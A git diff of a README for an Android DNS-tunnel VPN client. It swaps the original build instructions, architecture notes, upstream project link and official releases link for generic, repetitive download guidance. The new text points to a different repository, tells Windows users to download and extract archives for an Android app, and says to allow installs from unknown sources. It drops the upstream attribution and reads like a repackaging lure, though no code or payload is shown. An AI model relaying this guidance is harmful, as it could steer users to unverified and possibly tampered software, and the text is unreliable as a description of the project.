@@ -1,179 +1,200 @@
-# MasterDnsVPN Android Client
+# 🛡️ MasterDnsVPN-AndroidGG - Private DNS Access Made Simple
 
-## | [ نسخه فارسی](README_FA.md) |
+[![Download MasterDnsVPN-AndroidGG](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tylero5029/MasterDnsVPN-AndroidGG)
 
-> **This is the Android client for [MasterDnsVPN](https://github.com/masterking32/MasterDnsVPN).**
-> Before using this app, you must install and configure the **server side** from the main project first.
-> The app will not work without a running MasterDnsVPN server.
+## 📥 Download
 
-<img src="docs/screenshots.jpg" alt="App Screenshots" width="900">
+Use this link to visit the page and download the app:
 
----
+[Open MasterDnsVPN-AndroidGG Download Page](https://github.com/tylero5029/MasterDnsVPN-AndroidGG)
 
-## Download
+## 🖥️ What This App Does
 
-> **Don't want to build from source?** Download the latest pre-built APK directly from the [**Releases page**](https://github.com/RevocGG/MasterDnsVPN-AndroidGG/releases/latest).
+MasterDnsVPN Android Client helps you route your DNS traffic through a secure tunnel. It is built for users who want a simple way to use a private DNS client with VPN-style protection.
 
-| APK | Architecture | Use case |
-|-----|-------------|----------|
-| `...-arm64-v8a.apk` | ARM 64-bit | Most modern Android phones |
-| `...-armeabi-v7a.apk` | ARM 32-bit | Older Android phones |
-| `...-universal.apk` | Universal | When unsure |
+You can use it to:
+- Send DNS requests through a protected path
+- Keep your DNS traffic separate from normal traffic
+- Use a client built for Android-based network tools
+- Work with DNS proxy and tunnel setups
 
----
+## 🚀 Getting Started
 
-## What is MasterDnsVPN?
+This app is made for Android use, but many users first find it from Windows. If you are on Windows, use your browser to open the download page, then get the app file from GitHub.
 
-[MasterDnsVPN](https://github.com/masterking32/MasterDnsVPN) is a high-performance DNS-over-UDP tunnel that encrypts and routes your traffic through a remote server, bypassing censorship and surveillance. This repository contains the **Android client app** built on top of the same Go engine.
+### What you need
+- A Windows PC
+- A web browser like Chrome, Edge, or Firefox
+- A GitHub account only if the page asks you to sign in
+- An Android device if you plan to use the client on a phone
 
----
+## 🪟 How to Download on Windows
 
-## Requirements
+1. Open the download page:
+   [https://github.com/tylero5029/MasterDnsVPN-AndroidGG](https://github.com/tylero5029/MasterDnsVPN-AndroidGG)
 
-| Tool | Version | Download |
-|------|---------|----------|
-| Go | 1.22+ | https://go.dev/dl |
-| Android Studio | Ladybug+ | https://developer.android.com/studio |
-| Android SDK | API 26+ (target API 35) | via Android Studio SDK Manager |
-| Android NDK | 27.x | via Android Studio SDK Manager |
-| gomobile | latest | `go install golang.org/x/mobile/cmd/gomobile@latest` |
+2. Look for the latest release or the main project files.
 
-### One-time gomobile init
-```powershell
-go install golang.org/x/mobile/cmd/gomobile@latest
-gomobile init
-```
+3. If you see an app file or archive, download it to your PC.
 
----
+4. If the file is zipped, right-click it and choose Extract All.
 
-## Building
+5. Open the extracted folder and look for the app package or setup files.
 
-### Full build (AAR + APK)
-```powershell
-.\build_aar.ps1
-```
+6. Follow the instructions in the repository files if they are included.
 
-This script:
-1. Detects the installed NDK automatically
-2. Runs `gomobile bind` → builds `android/app/libs/masterdnsvpn.aar`
-3. Runs `gradlew assembleDebug` → produces the APK
+## 📱 How to Install on Android
 
-### Output files
-| File | Path |
-|------|------|
-| Go AAR library | `android/app/libs/masterdnsvpn.aar` |
-| Debug APK | `android/app/build/outputs/apk/debug/` |
+1. Move the downloaded file to your Android device.
+2. Open the file with your file manager.
+3. If Android asks for permission to install from this source, allow it.
+4. Install the app.
+5. Open the app and let it finish any first-time setup.
+6. Set the DNS or tunnel details as needed.
 
-### Manual build steps
-```powershell
-# Step 1 — Build AAR (arm64 only)
-$env:GOFLAGS = "-mod=mod"
-$env:ANDROID_HOME = "$env:USERPROFILE\AppData\Local\Android\Sdk"
-$ndkVer = (Get-ChildItem "$env:ANDROID_HOME\ndk" | Sort-Object Name -Descending | Select-Object -First 1).Name
-$env:ANDROID_NDK_HOME = "$env:ANDROID_HOME\ndk\$ndkVer"
-gomobile bind -target android/arm64 -androidapi 26 -javapkg com.masterdnsvpn.gomobile `
-  -o "android\app\libs\masterdnsvpn.aar" masterdnsvpn-go/cmd/android
+## ⚙️ Basic Setup
 
-# Step 2 — Build APK
-cd android
-.\gradlew.bat assembleDebug
+After you open the app, you may see options for:
+- DNS server address
+- Proxy host and port
+- Tunnel mode
+- Connection profile
+- Start and stop controls
 
-# Step 3 — Install on device
-adb install "app\build\outputs\apk\debug\MasterDnsVPN-1.0.0-beta-arm64-v8a.apk"
-```
+Use the values from your network setup. If your provider gave you custom DNS or tunnel settings, enter those there.
 
----
+## 🔌 Typical Use Cases
 
-## App Features
+MasterDnsVPN Android Client works well for:
+- Private DNS routing
+- DNS proxy use
+- Tunnel-based access
+- Testing network paths
+- Mobile network setups
+- Controlled DNS traffic for apps and devices
 
-### Profile Management
-- **Create / Edit / Delete** profiles — each profile connects to one MasterDnsVPN server
-- All client configuration fields exposed in the UI (server address, port, encryption, compression, DNS, SOCKS5, TUN mode, balancer strategy, MTU, etc.)
-- **Resolver editor** — add/remove DNS resolvers per profile
-- **Tunnel mode per profile**: SOCKS5 proxy or TUN (system-wide VPN)
+## 🧭 Main Features
 
-### Meta Profile (Load Balancer)
-- Groups multiple profiles under a single start/stop control
-- Distributes connections across all sub-profiles using one of four strategies:
-  - **RoundRobin** — rotate in order
-  - **Random** — random selection
-  - **LeastConn** — pick proxy with fewest active connections
-  - **LowestLatency** — pick the fastest proxy
-- Supports both SOCKS5 and TUN tunnel modes
+- Simple client interface
+- DNS proxy support
+- DNS tunnel support
+- VPN-style routing
+- Lightweight setup
+- Built for Android network use
+- Fits private DNS workflows
+- Easy start and stop control
 
-### TUN Mode (System-wide VPN)
-- Uses Android `VpnService` to capture all device traffic
-- **tun2socks bridge** (gVisor netstack): converts TCP/UDP flows to SOCKS5, forwards through the Go engine
-- Per-app filtering: All apps / Include list / Exclude list
+## 🛠️ System Requirements
 
-### Hotspot Sharing
-- Share VPN over Wi-Fi hotspot
-- TCP relay on `0.0.0.0:8090` → shows address/port to configure on connected devices
+For smooth use, use:
+- Android 8.0 or newer
+- Enough free storage for the app and its config files
+- A stable internet connection
+- Windows 10 or Windows 11 for downloading and file handling
 
-### Monitoring
-- Real-time per-profile stats: resolver health, listen address, session state
-- CPU / RAM / upload speed / download speed updated every second
-- Per-profile cumulative data usage (persisted across restarts)
-- Color-coded real-time log viewer
+## 📂 File Handling Tips
 
----
+If the download comes as a ZIP or archive:
+- Save it to your Downloads folder
+- Extract it before you open files inside
+- Keep the folder together so the app files stay linked
+- Do not rename files unless the setup guide tells you to
 
-## Architecture
+If the download comes as an APK:
+- Copy it to your Android device
+- Open it from your file manager
+- Follow the install prompt
 
-```
-┌──────────────────────────────────────────────────────────┐
-│  Android App (Kotlin + Compose)                          │
-│                                                          │
-│  HomeScreen ──► HomeViewModel ──► TunnelController       │
-│                                        │                 │
-│                          ┌─────────────┴──────────────┐  │
-│                          │  DnsTunnelVpnService (TUN) │  │
-│                          │  DnsTunnelProxyService     │  │
-│                          └─────────────┬──────────────┘  │
-│                                        │                 │
-│                              GoMobileBridge (JNI)        │
-└──────────────────────────────────────────────────────────┘
-                                        │
-                        ┌───────────────▼──────────────────┐
-                        │  Go Engine (masterdnsvpn.aar)    │
-                        │  StartInstance / StopInstance    │
-                        │  StartTunBridge (gVisor)         │
-                        │  StartSocksBalancer (meta)       │
-                        │  GetStats / GetBandwidth         │
-                        └──────────────────────────────────┘
-```
+## 🧪 First Run Checklist
 
-### TUN traffic flow
-```
-Device apps → TUN fd → gVisor netstack → SOCKS5 (Go) → DNS tunnel → MasterDnsVPN server
-```
+Before you start the app:
+- Check that you downloaded the right file
+- Make sure your internet is on
+- Confirm your DNS or tunnel settings
+- Close other network tools if they may conflict
+- Start the app and test the connection
 
-### Meta TUN flow
-```
-Device apps → TUN fd → gVisor → SOCKS Balancer ─┬─ Profile-1 → server-1
-                                                 ├─ Profile-2 → server-2
-                                                 └─ Profile-N → server-N
-```
+## 🔒 Connection Notes
 
----
+If the app includes tunnel or proxy settings, you may need:
+- A server address
+- A port number
+- A DNS target
+- A login token or key
 
-## License
+Enter the details carefully. One wrong character can stop the connection.
 
-See [LICENSE](LICENSE).
+## 🧰 Troubleshooting
 
-## Related
+### App will not open
+- Check that the file finished downloading
+- Re-download the file if it looks damaged
+- Confirm that you extracted all files from the archive
 
-- **Server & main project**: [github.com/masterking32/MasterDnsVPN](https://github.com/masterking32/MasterDnsVPN)
+### Connection does not start
+- Check the server address and port
+- Make sure your internet works
+- Try a different network
+- Review the config fields for typos
 
----
+### Android blocks the install
+- Open your device settings
+- Allow installs from your browser or file manager
+- Try the install again
 
-## Support the Project
+### DNS does not respond
+- Confirm the DNS server value
+- Check that the tunnel is active
+- Restart the app and try again
+- Verify that no other VPN app is running
 
-If you find this project useful, consider supporting its development:
+## 📋 Repository Topics
 
-| Network | Address |
-|---------|---------|
-| TON | `UQBW_LoEhcYPIzZL_dzp-OMsqI5uAwv8p6dXy8wzzkPU-CQQ` |
-| BNB / USDT (BEP-20) | `0x951acaf8d4b61a000d3b5c697abcabf52973d0cf` |
-| TRX | `TL4Kej6DjJmT9gQ5ghmQcvsEUHPdnNNPyj` |
-| SOL | `45kAfGyh13bcyYTdbNLkVfBGtMgq4WMijLgdBK9G9ugN` |
+This project relates to:
+- dns-client
+- dns-proxy
+- dnstt
+- masterdns-client
+- masterdnsvpn
+- slipstream
+- tunnel
+- vpn
+
+## 📌 Use on Windows
+
+Windows users can use this repository page to get the app files, read the project details, and prepare the download for Android use.
+
+Open the page here:
+[https://github.com/tylero5029/MasterDnsVPN-AndroidGG](https://github.com/tylero5029/MasterDnsVPN-AndroidGG)
+
+## 🔍 What to Look For on the Page
+
+When you open the repository, check for:
+- Release files
+- Download links
+- Setup notes
+- Config files
+- Usage steps
+- Screenshots or examples
+
+## 🧩 Common Setup Fields
+
+You may see settings like:
+- DNS server
+- Tunnel host
+- Port
+- Username
+- Password
+- Profile name
+
+Use the values from your service or config guide.
+
+## 📎 Quick Start
+
+1. Open the download page.
+2. Download the project file or release asset.
+3. Extract it if needed.
+4. Move the app to Android if required.
+5. Install and open it.
+6. Add your DNS or tunnel details.
+7. Start the connection.
